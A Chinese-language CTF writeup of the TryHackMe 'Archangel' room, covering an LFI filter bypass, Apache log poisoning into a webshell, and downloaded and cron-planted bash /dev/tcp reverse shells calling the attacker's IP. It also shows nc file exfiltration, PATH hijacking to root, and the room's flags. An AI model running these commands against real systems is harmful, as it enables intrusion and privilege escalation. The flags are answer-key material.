---
title: Archangel (Try Hack Me Writeup)
date: 2021-08-06T23:48:00+08:00
draft: false
url: "/2021/08/06/archangel-try-hack-me-writeup/"
categories:
  - 滲透測試
  - Try Hack Me
showToc: true
TocOpen: false
---

> 
url : https://tryhackme.com/room/archangel

IP : 10.10.163.60

## Recon

- 起手式，掃 Port `rustscan -a 10.10.163.60`![](/uploads/2022/02/4fbae-DkyiPwB.png)
- 80 , 22掃路徑 `python3 dirsearch.py -u http://10.10.163.60/ -e all`- ![](/uploads/2022/02/21bd5-VzsbcR0.png)觀察網頁首頁，發現裡面有 `/flag`- ![](/uploads/2022/02/c6590-ZEE1LMm.png)
- 點進去後 ……
- ![](/uploads/2022/02/2c29c-xjq9ave.png)
- 幹…
- 用 curl 觀察![](/uploads/2022/02/cf4f4-t50dIAx.png)
- 他會自動跳轉到這邊 https://www.youtube.com/watch?v=dQw4w9WgXcQ

## Dfferent Hostname

- 題目提示 : `Find a different hostname`![](/uploads/2022/02/d2734-qUlq0LJ.png)
- 可以觀察 `mafialive.thm``sudo vim /etc/hosts`- 加上這一行 `10.10.163.60 mafialive.thm`
- 接下來到 http://mafialive.thm/
- ![](/uploads/2022/02/e051f-KYuqXWR.png)
- 就拿到了 flag再掃一次路徑`python3 dirsearch.py -u http://mafialive.thm/ -e all`- `http://mafialive.thm/robots.txt`![](/uploads/2022/02/9e2fc-sAPv2Gu.png)
- `/test.php`http://mafialive.thm/test.php
- ![](/uploads/2022/02/a2a18-N9Ec4bZ.png)觀察按下按鈕後的網址- http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php
- ![](/uploads/2022/02/d7688-XPlzuRQ.png)
- 感覺很明顯可以 LFI嘗試 Base64 Payloadhttp://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php
- 成功 !!
- 觀察 test.php 原始碼http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php

```php
INCLUDE
	Test Page. Not to be Deployed

	 Here is a button
```

- 又撿到一個 flag `thm{explo1t1ng_lf1}`觀察原始碼發現，網址裡不能出現 `../..` 且一定要出現 `/var/www/html/development_testing``../..` 可以用 `.././..` 繞測試 `curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././etc/passwd`成功!!![](/uploads/2022/02/79e51-zGil911.png)來看 apache access log- `/var/log/apache2/access.log`
- `curl http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log`
- 成功 !!![](/uploads/2022/02/3c0a2-WYHb6LH.png)
- 往上拉發現所有的 host log 都在這邊，所以可以直接針對 ip 來做 nc 寫 php`nc 10.10.163.60 80`
- `GET /?`
- ![](/uploads/2022/02/3f636-MiuNtLX.png)再回去看一次 access log- http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log
- 成功出現 phpinfo !!
- ![](/uploads/2022/02/d5a57-XqQ4scJ.png)寫入 webshell- `nc 10.10.163.60 80`
- `GET /`![](/uploads/2022/02/7eb4e-wGnyObt.png)
- http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log&A=ls![](/uploads/2022/02/ea69f-JHfk4lv.png)下載 reverse shell- `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log&B=wget 10.13.21.55:8000/s -O /tmp/s`![](/uploads/2022/02/1b396-GDeKuQ2.png)
- 本地準備監聽 `nc -vlk 7877`
- 執行 shell `http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././.././.././.././var/log/apache2/access.log&B=bash%20/tmp/s`
- 成功接上
- ![](/uploads/2022/02/910b2-JkQjkHV.png)使用 python 讓 terminal 變漂亮- `python3 -c 'import pty; pty.spawn("/bin/bash")'`找 user flag- ![](/uploads/2022/02/ee60c-voiBmAr.png)
- `thm{lf1_t0_rc3_1s_tr1cky}`找到使用者資料夾內有 passwordbackup- ![](/uploads/2022/02/5c0be-LKIcTu2.png)
- 幹…再一次
- 等……等等，不會吧
- 該不會那個網址真 TM 是他的密碼 ?__?
- ![](/uploads/2022/02/ba65b-rngMQwS.png)好的，好險不是使用 Linpeas 掃- `wget 10.13.21.55:8000/linpeas.sh`
- `bash linpeas.sh`找到一個可疑的 cron job![](/uploads/2022/02/e3381-9QYLgx9.png)發現 這個 cron 會使用 `archangel` 來執行，而且我們對 `/opt/helloworld.sh`有讀寫權限![](/uploads/2022/02/73180-YYauluN.png)寫入 reverse shell`echo "bash -c 'bash -i >& /dev/tcp/10.13.21.55/7878 0>&1'" >> /opt/helloworld.sh`等待一分鐘後，自動接上!!- ![](/uploads/2022/02/f17f3-ZQ4fZmN.png)
- ![](/uploads/2022/02/72118-D3bK7Rc.png)
- 找到 flag`thm{h0r1zont4l_pr1v1l3g3_2sc4ll4t10n_us1ng_cr0n}`觀察使用者中的 secret 資料夾中- 有一個 backup 檔案有 suid![](/uploads/2022/02/78721-omAJJqD.png)透過 nc 把檔案傳出來- 監聽端 `nc -l -p 1234 > meow`
- 發送端 `nc 10.13.21.55 1234 哼!這種等級的 reverse，連 ida 都不用開，我們用 r2 就好ㄌ- `r2 meow`
- `aaa`
- `s main`
- `VV`
- ![](/uploads/2022/02/2bc2a-P6euu23.png)
- 可以看到他會用 system call 一個 cp
- 而 cp 沒有寫絕對路徑，所以可以用 path 進行誤導

## 誤導 path

- 在家目錄創一個 fakepath`mkdir fakepath`
- `export PATH=/home/archangel/fakepath:$PATH`準備一個假的 cp 檔案- `echo '#!/bin/bash' > cp`
- `echo "/bin/bash" >> cp`
- `chmod +x cp`執行 backup- `./backup`取得 root 權限 !!- ![](/uploads/2022/02/cac95-h6rVFzI.png)`thm{p4th_v4r1abl3_expl01tat1ion_f0r_v3rt1c4l_pr1v1l3g3_3sc4ll4t10n}`
